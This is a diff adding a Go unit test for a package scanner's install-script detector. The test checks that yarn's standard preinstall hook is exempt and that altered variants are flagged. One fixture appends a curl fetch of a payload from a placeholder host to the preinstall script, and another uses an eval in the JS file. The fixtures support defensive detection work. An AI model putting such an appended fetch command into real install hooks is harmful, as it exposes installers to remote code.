@@ -616,3 +616,42 @@ func repeatStr(s string, n int) string {
 	}
 	return result.String()
 }
+
+func TestYarnPreinstallException(t *testing.T) {
+	const standard = ":; (node ./preinstall.js > /dev/null 2>&1 || true)"
+	for _, tc := range []struct {
+		name, pkgName, manifestName, hook, script, js string
+		warn, obfuscated                              bool
+	}{
+		{"official", "yarn", "yarn", "preinstall", standard, "// benign", false, false},
+		{"other-package", "other", "other", "preinstall", standard, "", true, false},
+		{"mismatched-directory", "other", "yarn", "preinstall", standard, "", true, false},
+		{"mismatched-manifest", "yarn", "other", "preinstall", standard, "", true, false},
+		{"other-hook", "yarn", "yarn", "postinstall", standard, "", true, false},
+		{"appended-command", "yarn", "yarn", "preinstall", standard + " && curl https://example.invalid/payload", "", true, false},
+		{"different-target", "yarn", "yarn", "preinstall", strings.ReplaceAll(standard, "preinstall.js", "payload.js"), "", true, false},
+		{"modified-js", "yarn", "yarn", "preinstall", standard, `eval("synthetic fixture")`, false, true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			dir := t.TempDir()
+			data, err := json.Marshal(packageJSON{Name: tc.manifestName, Version: "1.22.22", Scripts: map[string]string{tc.hook: tc.script}})
+			if err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(filepath.Join(dir, "package.json"), data, 0644); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(filepath.Join(dir, "preinstall.js"), []byte(tc.js), 0644); err != nil {
+				t.Fatal(err)
+			}
+			s := New(dir, false)
+			s.checkPackage(dir, tc.pkgName)
+			if got := len(findingsFor(s, "suspicious-install-script")) > 0; got != tc.warn {
+				t.Errorf("warning=%v, want %v: %v", got, tc.warn, s.Findings)
+			}
+			if got := len(findingsFor(s, "obfuscated-install-script")) > 0; got != tc.obfuscated {
+				t.Errorf("obfuscated=%v, want %v: %v", got, tc.obfuscated, s.Findings)
+			}
+		})
+	}
+}
